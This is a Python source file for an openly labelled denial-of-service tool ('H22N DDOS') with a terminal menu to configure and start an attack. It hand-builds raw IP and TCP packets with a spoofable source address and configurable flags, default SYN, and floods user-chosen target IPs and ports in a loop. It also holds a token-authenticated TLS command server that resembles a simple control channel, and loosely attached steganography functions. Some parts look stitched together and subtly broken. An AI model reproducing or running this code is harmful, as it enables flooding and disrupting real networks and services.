import socket
import threading
import random
import struct
import ssl
import asyncio
import curses
import signal
from concurrent.futures import ThreadPoolExecutor
from colorama import Fore, Style, init
from PIL import Image
import io
from pyfiglet import figlet_format

# Initialize colorama
init(autoreset=True)

# Global variables
stop_threads = False
cout_lock = threading.Lock()
target_ips = []
target_ports = []
packet_rate = 1
packet_flags = {'SYN': 1}
source_ip = '0.0.0.0'
AUTH_TOKEN = "secure_token"

def checksum(msg):
    """Calculate the checksum of a packet."""
    s = 0
    for i in range(0, len(msg), 2):
        w = (msg[i] << 8) + msg[i + 1]
        s += w
    s = (s >> 16) + (s & 0xffff)
    s = ~s & 0xffff
    return s

def create_ip_header(source_ip, dest_ip):
    """Create the IP header."""
    ihl = 5
    version = 4
    tos = 0
    tot_len = 20 + 20
    id = random.randint(0, 65535)
    frag_off = 0
    ttl = 255
    protocol = socket.IPPROTO_TCP
    check = 0
    saddr = socket.inet_aton(source_ip)
    daddr = socket.inet_aton(dest_ip)

    ip_header = struct.pack('!BBHHHBBH4s4s',
                            (version << 4) + ihl,
                            tos,
                            tot_len,
                            id,
                            frag_off,
                            ttl,
                            protocol,
                            check,
                            saddr,
                            daddr)

    check = checksum(ip_header)
    ip_header = struct.pack('!BBHHHBBH4s4s',
                            (version << 4) + ihl,
                            tos,
                            tot_len,
                            id,
                            frag_off,
                            ttl,
                            protocol,
                            socket.htons(check),
                            saddr,
                            daddr)
    return ip_header

def create_tcp_header(source_ip, dest_ip, dest_port, flags):
    """Create the TCP header."""
    source = random.randint(1024, 65535)
    seq = random.randint(0, 4294967295)
    ack_seq = 0
    doff = 5
    fin = flags.get('FIN', 0)
    syn = flags.get('SYN', 1)
    rst = flags.get('RST', 0)
    psh = flags.get('PSH', 0)
    ack = flags.get('ACK', 0)
    urg = flags.get('URG', 0)
    window = socket.htons(5840)
    check = 0
    urg_ptr = 0
    offset_res = (doff << 4) + 0
    tcp_flags = fin + (syn << 1) + (rst << 2) + (psh << 3) + (ack << 4) + (urg << 5)

    tcp_header = struct.pack('!HHLLBBHHH',
                             source,
                             dest_port,
                             seq,
                             ack_seq,
                             offset_res,
                             tcp_flags,
                             window,
                             check,
                             urg_ptr)

    source_address = socket.inet_aton(source_ip)
    dest_address = socket.inet_aton(dest_ip)
    placeholder = 0
    protocol = socket.IPPROTO_TCP
    tcp_length = len(tcp_header)

    pseudo_header = struct.pack('!4s4sBBH',
                                source_address,
                                dest_address,
                                placeholder,
                                protocol,
                                tcp_length)

    psh = pseudo_header + tcp_header
    tcp_checksum = checksum(psh)

    tcp_header = struct.pack('!HHLLBBH',
                             source,
                             dest_port,
                             seq,
                             ack_seq,
                             offset_res,
                             tcp_flags,
                             window) + struct.pack('H', tcp_checksum) + struct.pack('!H', urg_ptr)

    return tcp_header

async def send_packet(target_ip, target_port, source_ip, packet_rate, packet_flags):
    """Send packets to the target IP and port."""
    with socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP) as s:
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
        ip_header = create_ip_header(source_ip, target_ip)
        tcp_header = create_tcp_header(source_ip, target_ip, target_port, packet_flags)
        packet = ip_header + tcp_header
        while not stop_threads:
            try:
                s.sendto(packet, (target_ip, 0))
                with cout_lock:
                    print(Fore.GREEN + f"[INFO] Packet sent to {target_ip}:{target_port} from {source_ip} with flags {packet_flags}")
            except Exception as e:
                with cout_lock:
                    print(Fore.RED + f"[ERROR] Error sending packet: {e}")
            await asyncio.sleep(1 / packet_rate)

def signal_handler(sig, frame):
    """Handle interrupt signals."""
    global stop_threads
    with cout_lock:
        print(Fore.YELLOW + "\n[INFO] Interrupt signal received. Terminating all threads gracefully...")
    stop_threads = True

async def main():
    """Main async function to start the attack."""
    while not stop_threads:
        with ThreadPoolExecutor() as executor:
            tasks = [asyncio.ensure_future(send_packet(ip, port, source_ip, packet_rate, packet_flags))
                     for ip in target_ips for port in target_ports]
            await asyncio.gather(*tasks)
            await asyncio.sleep(10)

def encode_message(image_path, message):
    """Encode a message into an image using LSB."""
    image = Image.open(image_path)
    encoded_image = image.copy()
    pixels = encoded_image.load()
    message_bytes = message.encode('utf-8')

    index = 0
    for i in range(image.size[0]):
        for j in range(image.size[1]):
            if index < len(message_bytes):
                pixel = list(pixels[i, j])
                pixel[0] = (pixel[0] & ~1) | (message_bytes[index] & 1)
                pixels[i, j] = tuple(pixel)
                index += 1
            else:
                break
        if index >= len(message_bytes):
            break

    encoded_image.save('encoded_image.png')

def decode_message(image_path):
    """Decode a message from an image."""
    image = Image.open(image_path)
    pixels = image.load()
    message_bits = []

    for i in range(image.size[0]):
        for j in range(image.size[1]):
            pixel = pixels[i, j]
            message_bits.append(pixel[0] & 1)
            if len(message_bits) >= 8:
                byte = sum([bit << (7 - i) for i, bit in enumerate(message_bits[-8:])])
                if byte == 0:
                    break
        if byte == 0:
            break

    return bytes(message_bits).decode('utf-8')

def handle_client(client_socket):
    """Handle communication with a client."""
    try:
        auth_token = client_socket.recv(1024).decode()
        if auth_token != AUTH_TOKEN:
            client_socket.send("AUTH_FAILED".encode())
            return

        client_socket.send("AUTH_SUCCESS".encode())

        while True:
            command = client_socket.recv(1024).decode()
            if not command:
                break

            if command == "PING":
                client_socket.send("PONG".encode())
            elif command == "STATUS":
                client_socket.send("ACTIVE".encode())
            elif command.startswith("RUN"):
                client_socket.send(f"Executing: {command}".encode())
            elif command.startswith("STEGO:"):
                img_path = command.split(":")[1]
                msg = decode_message(img_path)
                client_socket.send(f"Stego Message: {msg}".encode())
            else:
                client_socket.send("UNKNOWN_COMMAND".encode())

    except Exception as e:
        with cout_lock:
            print(Fore.RED + f"[ERROR] Client handling error: {e}")

    finally:
        client_socket.close()

def server_main(host, port, certfile, keyfile):
    """Start the server and listen for incoming connections."""
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)
    server = ssl.wrap_socket(server, server_side=True, certfile=certfile, keyfile=keyfile, ssl_version=ssl.PROTOCOL_TLS)

    while True:
        client_socket, addr = server.accept()
        threading.Thread(target=handle_client, args=(client_socket,)).start()

def select_option(stdscr):
    """Display and handle menu options."""
    global selected_option

    options = [
        "Start Attack",
        "Configure Settings",
        "Exit"
    ]

    def draw_menu(selected_idx):
        stdscr.clear()
        h, w = stdscr.getmaxyx()
        for idx, option in enumerate(options):
            x = w // 2 - len(option) // 2
            y = h // 2 - len(options) // 2 + idx
            if idx == selected_idx:
                stdscr.attron(curses.color_pair(1))
                stdscr.addstr(y, x, option, curses.A_BOLD)
                stdscr.attroff(curses.color_pair(1))
            else:
                stdscr.addstr(y, x, option)
        stdscr.refresh()

    curses.curs_set(0)
    curses.start_color()
    curses.init_pair(1, curses.COLOR_BLACK, curses.COLOR_CYAN)
    selected_option = 0

    # Print Figlet header
    header = figlet_format("H22N DDOS", font="starwars")
    stdscr.addstr(0, 0, header, curses.color_pair(1))
    stdscr.refresh()

    draw_menu(selected_option)

    while True:
        key = stdscr.getch()

        if key == curses.KEY_UP:
            selected_option = (selected_option - 1) % len(options)
        elif key == curses.KEY_DOWN:
            selected_option = (selected_option + 1) % len(options)
        elif key in [curses.KEY_ENTER, 10, 13]:
            if options[selected_option] == "Start Attack":
                stdscr.addstr("Starting attack...", curses.A_BOLD)
                stdscr.refresh()
                stdscr.getch()
                asyncio.run(main())
                break
            elif options[selected_option] == "Configure Settings":
                configure_settings(stdscr)
            elif options[selected_option] == "Exit":
                return
        draw_menu(selected_option)

def configure_settings(stdscr):
    """Configure attack settings."""
    global target_ips, target_ports, packet_rate, packet_flags, source_ip

    settings_options = [
        "Target IPs (comma separated)",
        "Target Ports (comma separated)",
        "Packet Rate",
        "Source IP",
        "Flags (comma separated)",
        "Back"
    ]

    def draw_settings(selected_idx):
        stdscr.clear()
        h, w = stdscr.getmaxyx()
        for idx, option in enumerate(settings_options):
            x = w // 2 - len(option) // 2
            y = h // 2 - len(settings_options) // 2 + idx
            if idx == selected_idx:
                stdscr.attron(curses.color_pair(2))
                stdscr.addstr(y, x, option, curses.A_BOLD)
                stdscr.attroff(curses.color_pair(2))
            else:
                stdscr.addstr(y, x, option)
        stdscr.refresh()

    curses.curs_set(1)
    curses.init_pair(2, curses.COLOR_BLACK, curses.COLOR_YELLOW)
    selected_option = 0

    draw_settings(selected_option)

    while True:
        key = stdscr.getch()

        if key == curses.KEY_UP:
            selected_option = (selected_option - 1) % len(settings_options)
        elif key == curses.KEY_DOWN:
            selected_option = (selected_option + 1) % len(settings_options)
        elif key in [curses.KEY_ENTER, 10, 13]:
            if settings_options[selected_option] == "Back":
                return
            else:
                stdscr.addstr("Enter new value: ")
                stdscr.refresh()
                curses.echo()
                user_input = stdscr.getstr().decode()
                curses.noecho()

                if settings_options[selected_option] == "Target IPs (comma separated)":
                    target_ips = [ip.strip() for ip in user_input.split(',')]
                elif settings_options[selected_option] == "Target Ports (comma separated)":
                    target_ports = [int(port.strip()) for port in user_input.split(',')]
                elif settings_options[selected_option] == "Packet Rate":
                    try:
                        packet_rate = float(user_input.strip())
                    except ValueError:
                        stdscr.addstr("Invalid packet rate. Please enter a number.")
                        stdscr.refresh()
                        stdscr.getch()
                elif settings_options[selected_option] == "Source IP":
                    source_ip = user_input.strip()
                elif settings_options[selected_option] == "Flags (comma separated)":
                    flags = [flag.strip() for flag in user_input.split(',')]
                    packet_flags = {flag: 1 for flag in flags}

        draw_settings(selected_option)

def main_ui(stdscr):
    """Main UI function."""
    signal.signal(signal.SIGINT, lambda sig, frame: signal_handler(sig, frame))
    curses.start_color()
    select_option(stdscr)

if __name__ == "__main__":
    curses.wrapper(main_ui)
